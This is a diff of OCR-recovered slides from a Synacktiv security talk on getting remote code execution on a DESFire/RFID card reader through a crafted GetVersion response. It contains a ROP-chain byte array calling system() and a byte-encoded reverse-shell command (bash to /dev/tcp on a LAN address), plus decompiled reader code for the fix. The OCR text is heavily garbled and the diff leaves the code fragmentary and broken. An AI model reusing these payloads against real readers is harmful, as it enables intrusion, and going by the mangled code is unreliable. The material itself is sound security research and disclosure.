 DEBUG_PRINT_P(PSTR("EV@CmdGetVersion2:DF_GET_VERSION_frame_counter -- %d\n"),
 DF_GET_VERSION_frame_counter) ;
 // Buffer[®] = STATUS_ADDITIONAL_FRAME;
@@ -2011,22 +1815,14 @@ DF_GET_VERSION_frame_counter) ;
 // Buffer[7] = Picc.SwProtocolType;
 // DesfireState = DESFIRE_GET_VERSION3;
 unsigned char ropchain [] = {
-STATUS_ADDITIONAL_FRAME ,
-@x43, 0x43, 0x43, // padding
 @x78, @x@6, @x25, 0x00, // first gadget:
-@x49, @x49, Ox49, Ox49, @x49, Ox49, 0x49, 0x49,
-@x8d, @x2b, Ox57, 0x0, // x11 value
-Qx60, Ox68, Ox3@, x00
 //
-};
-memcpy (Buffer, ropchain, 24);
 DesfireState = DESFIRE_GET_VERSION3;
 return 24;
 // second gadget:
 "POP {R3, R4, R11, PC}"
 "LDR R@, R11-@x5c"
 "BL system()"
-& OYNACKTIV
 57
 ```
 
@@ -2042,11 +1838,11 @@ Remote Code Execution
 
 PUBLIC
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 78/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Exploitation #SYNACKTIV
-Remote Code Execution
 Exploitation strategy
 uint16_t EV0CmdGetVersion3(uint8_t *Buffer, uint16_t ByteCount) {
 DEBUG_PRINT_P(PSTR("EV@CmdGetVersion3 :DF_GET_VERSION_frame_counter -- %d\n"),
@@ -2058,12 +1854,7 @@ STATUS_OPERATION_OK,
 @x35, Ox2a, @x57, 0x00, // ptr(command)
 // '/bin/bash -i >& /dev/tcp/192.168.1.42/8080 @>&1\x0'
 Ox2f, @x62, @x69, Ox6e, Ox2f, @x62, Ox61, Ox73, 9x68,
-@x20, @x2d, @x69, 0x20, O@x3e, Ox26, x20, Ox2f, 0x64,
 Qx65, @x76, Ox2f, @x74, 0x63, @x70, Ox2f, Ox31, 0x39,
-@x32, @x2e, @x31, 0x36, @x38, Ox2e, Ox31, Ox2e, 0x34,
-Qx32, @x2f, @x38, 0x30, Ox38, @x30@, 0x20, Ox30, Ox3e,
-Qx26, @x31, @x00
-hi
 memcpy (Buffer, system_command, 1+4+48) ;
 DesfireState = DESFIRE_IDLE;
 return 1+4+48;
@@ -2096,51 +1887,34 @@ Remote Code Execution
 
 PUBLIC
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-Exploitation
-Remote Code Execution
 Fix
 ir...
 if (vi2)
-{
 MASG_logger: :10g(700,
 goto LABEL_21;
 (int) "Failed to activate the tag.", (const char *)v22);
-,
 if ( Desfire_GetVersion(pVersionInfo) )
-{
 MASG_logger::10g(700, (int)"No NXP Mifare!", ;
 MASG_logger::10g(700, (int)"A Potential SEOS", dv;
 LOWORD(v12) = 16;
 ta3 = 16;
-y
-{
 ta3 |= 4u;
 MASG_logger::10g(700, (int)"A Desfire", a3);
 LOWORD(v12) = 4;
-,
 goto LABEL_71;
-,
 if ( (SAK_1 & 0x20) I= 0 )
-{
 if ( sub_3FE674(255, v75, OxFu, (int)pVersionInfo, (int) &v60)
-|| LOBYTE(pVersionInfo[0]) != 144
 | BYTE1(pVersionInfo[0]) )
-{
 if ( sub_3FE674(255, v72, OxFu, (int)pVersionInfo, (int) &v59)
-LOBYTE (pVers I= 144
-in)
-|| BYTE1 (pVer
-{
 if ( sub_3FDCD4(255) || sub_3FC9A8(v71, (unsigned __int8)v58[0]) || sub_3FDD78(255, v8
-{
 MASG_logger: : log (
 700,
 (int)"A Smart MX with Mifare 4K Desfire Card... but card selection failed 2nd time...",
 v17 = 128;
-PUBLIC
 506
 507
 508
@@ -2181,38 +1955,23 @@ PUBLIC
 543
 544
 2 || v73 1= 188 || v74 I= 214)
-(int) "Going t.
 lect DESfir
-SYNACKTIV
 Application\n" di
 v43 = (const char *)SPROX_Desfire.
-logger: :log((MASG_logger *)0x2BC,
-;ctApplication (0) ;
-(int) "
 eturn code from SPROX_Desfire_SelectApplication:
 d\n", v4
-ZT
 MASG_logger: :1og((MASG_logger *)0x2BC, (int)"No NXP Mifare!",
 MASG_logger: :1og((MASG_logger *)0x2BC, (int)"A Potential SEOS",
 v17 = 16;
 LOWORD(v12) = 16;
 *a3 = 16;
-,
 else
-{
 tas |= 4u;
 MASG_logger: :1log((MASG_logger *)0x2BC, (int)"A Desfire", a3);
 LOWORD(v12) = 4;
-,
 if ( v57[0] )
-{
 do
-{
-iistring::push_back(a4, v67[v36]);
-+4037;
-,
 while ( v37 < (int) (unsigned __int8)v57[0] );
-,
 goto LABEL_19;
 6 = (const char *)sub_459644((unsigned __int8)*a6, &v71, (unsigned
 __int8)v57[2]);
@@ -2311,13 +2070,3 @@ PUBLIC
 ## Slide 65
 
 **https://www.linkedin.com/company/synacktiv https://twitter.com/synacktiv https://synacktiv.com**
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-= SYNACKTIV
-e
-BED = https: //www.linkedin.com/company/synacktiv
-wW https: / /twitter.com/synacktiv
-oy https: / /synacktiv.com
-```
